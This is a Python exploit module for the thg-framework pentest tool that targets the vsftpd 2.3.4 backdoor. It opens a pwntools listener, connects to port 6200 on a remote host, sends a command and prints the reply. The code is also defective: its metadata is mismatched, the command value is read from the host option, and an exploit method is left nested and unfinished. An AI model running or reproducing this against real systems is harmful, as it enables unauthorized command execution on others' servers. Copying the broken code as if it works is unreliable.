##
# This module requires lib: https://darkcode0x00.com/download
# Current source: https://github.com/darkcode357/thg-framework
##
from lib.thg.core.BaseXmodeClass.BaseMod import BaseMod
from lib.thg.core.BaseXmodeClass.BaseOption import BaseOption
from lib.thg.core.Interpreter.THGInterpreter import ThgInterpreter

thgcli = ThgInterpreter()
import socket


class Exploit(BaseMod):
    def __init__(self):
        super(Exploit, self).__init__()
        self.update_info(
            {
                "name": "vsftpd_234_backdoor.py",
                "description": """reverse shell programing.""",
                "author": ["darkcode0x00"],
                "references": [
                    "darkcode0x00 pro",
                ],
                "disclosure_date": "2020, 10, 5",
                "service_name": "reverse shell",
                "service_version": "telegram send bot msg 0.1",
            }
        )
        self.register_options(
            [
                BaseOption(name="LPORT", required=True, description="LISTEN", value=""),
                BaseOption(
                    name="RPORT", required=True, description="REMOTE PORTE", value=""
                ),
                BaseOption(
                    name="RHOST", required=True, description="REMOTE HOST", value=""
                ),
                BaseOption(
                    name="COMMAND", required=True, description="SEND COMMAND", value=""
                ),
            ]
        )

    def check(self):
        Lport = self.options.get_option("LPORT")
        thgcli.runcmds_plus_hooks(
            ["""py from pwn import *""", """py cs =listen({})""".format(Lport)]
        )
        port = self.options.get_option("RPORT")
        ip = self.options.get_option("RHOST")
        command = self.options.get_option("RHOST")
        print("1")
        try:
            print("[*] Attempting to connect to backdoor...")
            backdoor_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            backdoor_socket.connect((ip, 6200))
            print("[+] Connected to backdoor on %s:6200" % ip)
            command = str.encode(command + "\n")
            backdoor_socket.send(command)
            response = backdoor_socket.recv(1024).decode("utf-8")
            print("[+] Response:\n", response, sep="")
            backdoor_socket.close()

        except Exception:
            print("[!] Failed to connect to backdoor on %s:6200" % ip)

        def exploit(self):
            port = self.options.get_option("LPORT")
